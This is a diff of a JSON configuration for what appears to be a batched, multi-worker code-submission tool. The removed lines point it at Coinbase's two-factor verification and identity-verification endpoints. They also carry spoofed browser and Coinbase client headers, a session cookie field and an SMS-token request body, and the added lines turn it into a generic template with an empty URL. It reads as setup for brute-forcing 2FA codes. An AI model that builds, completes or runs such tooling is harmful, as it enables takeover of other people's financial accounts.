@@ -1,38 +1,18 @@
 {
   "connAttempts": 10,
   "connAttemptsTtsSec": 5,
-  "batchSize": 100,
-  "workersFactor": 3,
+  "batchSize": 10,
+  "workersFactor": 1,
   "workersSemaphoreWeight": 2,
   "verifierConfig": {
     "method": "POST",
-    "url": "https://login.coinbase.com/api/two-factor/v1/verify",
+    "url": "",
     "headers": {
-      "sec-ch-ua":          "\"Google Chrome\";v=\"117\", \"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"117\"",
-      "X-CB-Device-ID":     "unknown",
-      "X-CB-Project-Name":  "unknown",
-      "Accept-Language":    "en",
-      "X-CB-Is-Logged-In":  "false",
-      "X-CB-Platform":      "unknown",
-      "CB-CLIENT":          "CoinbaseWeb",
-      "X-CB-Session-UUID":  "unknown",
-      "X-CB-Pagekey":       "unknown",
-      "cb-version":         "2021-01-11",
-      "X-CB-Version-Name":  "unknown",
-      "sec-ch-ua-platform": "macOS",
-      "X-CB-UJS":           "",
-      "redirect":           "follow",
-      "sec-ch-ua-mobile":   "?0",
-      "User-Agent":         "ua",
-      "Accept":             "application/json",
-      "Referer":            "https://www.coinbase.com",
-      "Content-Type":       "application/json",
-      "Cookie":             "login-session=sess"
+      "Content-Type": "application/json"
     },
-    "body": "{\n  \"sms\": {\n    \"token\": \"9195183\"\n  },\n  \"constraints\": {\n    \"mode\": \"ALLOW\",\n    \"types\": [\n      \"NO_2FA\",\n      \"SMS\",\n      \"TOTP\",\n      \"U2F\",\n      \"IDV\",\n      \"RECOVERY_CODE\",\n      \"PUSH\",\n      \"PASSKEY\",\n      \"SECURITY_QUESTION\"\n    ]\n  },\n  \"action\": \"web-UnifiedLogin-IdentificationPrompt\",\n  \"bot_token\": \"\"\n}",
+    "body": "{\n  \"code\": %s\n}",
     "customConfig": {
-   "verifyIdentityUrl": "https://login.coinbase.com/api/v1/verify-identification",
-      "verifyIdentityBody": "{\n  \"recaptcha_token\": \"\",\n  \"proof_token\": \"%s\"\n}"
+      "successStatus": "200"
     }
   }
 }
